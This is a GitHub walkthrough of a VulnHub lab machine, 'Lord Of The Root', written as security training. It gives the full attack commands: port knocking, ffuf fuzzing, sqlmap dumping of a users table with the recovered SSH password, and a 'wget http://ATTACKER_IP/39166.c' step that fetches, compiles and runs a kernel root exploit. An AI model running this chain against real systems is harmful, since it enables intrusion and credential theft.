# 👑 Lord Of The Root — VulnHub Walkthrough

Exploited a SQL Injection vulnerability to bypass authentication, dumped database credentials using SQLMap, gained SSH access as a valid user, and escalated privileges to root via a local kernel exploit.

---

# 📌 Overview

This repository contains a complete walkthrough of compromising the **Lord Of The Root** machine from initial reconnaissance to full root access.

## ⚔ Attack Chain

- 🔓 Port Knocking
- 💉 SQL Injection Authentication Bypass
- 🗄 Database Enumeration
- 🔑 Credential Reuse
- 👑 Local Privilege Escalation

---

# 🛠 Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port Scanning & Service Detection |
| Knock | Port Knocking |
| FFUF | Directory Enumeration |
| Burp Suite | Request Interception & SQLi Testing |
| SQLMap | Automated SQL Injection Exploitation |
| Searchsploit | Privilege Escalation Research |
| GCC | Compile Local Exploit |
| SSH | Remote Access |

---

# 🔎 Reconnaissance

Initial scan was performed using Nmap:

```bash
nmap -sC -sV -p- 192.168.10.7
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/0d838cfd840d2e32851111906bf304186f5e5c00/Screenshot%202026-05-06%20135038.png

### Result

```text
22/tcp open ssh
```

Attempted SSH access:

```bash
ssh 192.168.10.7
```

A hint saying:

```text
Easy as 1 2 3
```

was discovered.

---

# 🚪 Port Knocking

Used the Knock tool:

```bash
knock -v 192.168.10.7 1 2 3
```

Performed another Nmap scan:

```bash
nmap -p- 192.168.10.7
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/705de236d108d86578af5b14e80a1b1511ac5b75/Screenshot%202026-05-06%20135822.png

### New Port Discovered

```text
1337/tcp open http
```

---

# 🌐 Web Enumeration

Accessed the web service:

```text
http://192.168.10.7:1337
```

Directory fuzzing using FFUF:

```bash
ffuf -u http://192.168.10.7:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt -e 'html,.txt,.php' -fw 21
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/c641e776fd0351c2c6e9ee053d68206fb394cec4/Screenshot%202026-05-06%20140152.png

A hidden file was discovered:

```text
404.html
```

---

# 🔐 Decoding Hidden Message

The page source contained a double Base64 encoded message.

Decoded using:

```bash
echo "ENCODED_TEXT" | base64 -d
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/43898b082bebbb567eb54ddd9236f3e9ced7d54e/Screenshot%202026-05-06%20140453.png

Hidden directory discovered:

```text
/978345210/index.php
```

---

# 🔑 Login Panel Discovery

Hidden login panel:

```text
http://192.168.10.7:1337/978345210/index.php
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/96541ea03ad8b29a104907165c64688f1ad3b205/Screenshot%202026-05-06%20140614.png

---

# 🗄 Database Enumeration with SQLMap

Captured request saved as:

```text
root1.txt
```

Identify database:

```bash
sqlmap -r root1.txt --dbs
```

Extract tables:

```bash
sqlmap -r root1.txt -D webapp --tables
```

Dump credentials:

```bash
sqlmap -r root1.txt -D webapp -T users --dump
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/b2de898d4b153493af3d04c5aa20acc504055ca6/Screenshot%202026-05-07%20150912.png

### Credentials Found

```text
Username: smeagol
Password: MyPreciousR00t
```

---

# 🖥 Initial Shell Access

SSH login:

```bash
ssh smeagol@192.168.10.7
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/a6ebd2d3998ea37b3fdb6d65b4cb817c94cf9f74/Screenshot%202026-05-07%20151006.png

---

# 🔍 System Enumeration

Gathered system information:

```bash
uname -a
```

```bash
lsb_release -a
```

### Result

```text
Ubuntu 14.04
```

---

# 👑 Privilege Escalation

Searched for local exploits:

```bash
searchsploit ubuntu 14.04
```

Exploit identified:

```text
39166.c
```

Transferred exploit:

```bash
wget http://ATTACKER_IP/39166.c
```

Compiled exploit:

```bash
gcc 39166.c -o exploit
```

Executed exploit:

```bash
./exploit
```
---

# 💀 Root Access Achieved

Root shell successfully obtained.

```bash
root@LordOfTheRoot:/#
```

## 📸 Screenshot

https://github.com/Salik921/Lord-Of-The-Root---VulnHub-Walkthrough/blob/ed396b2cc44ec1d0d8af16a2832bc869304c0213/Screenshot%202026-05-07%20152230.png

---

# 🛡 Mitigation

- Disable unnecessary port knocking exposure
- Sanitize user inputs against SQL Injection
- Use parameterized queries
- Store passwords securely using strong hashing
- Keep Linux kernel updated
- Restrict sensitive files and hidden directories
- Implement Web Application Firewall (WAF)

---

# 🧠 Lessons Learned

This machine demonstrated:

- Real-world enumeration techniques
- Importance of hidden services
- SQL Injection exploitation workflow
- Credential harvesting
- Linux privilege escalation methodology
- Chaining multiple vulnerabilities for full compromise

---

# ⚠ Disclaimer

This walkthrough was created for educational purposes and authorized lab environments only.

---

👨‍💻 Author
salik921
💻 Penetration Testing Enthusiast
🔥 Red Teaming Learner
🛡 Web Exploitation & Privilege Escalation

### ⭐ If you found this walkthrough useful, give this repository a star ⭐


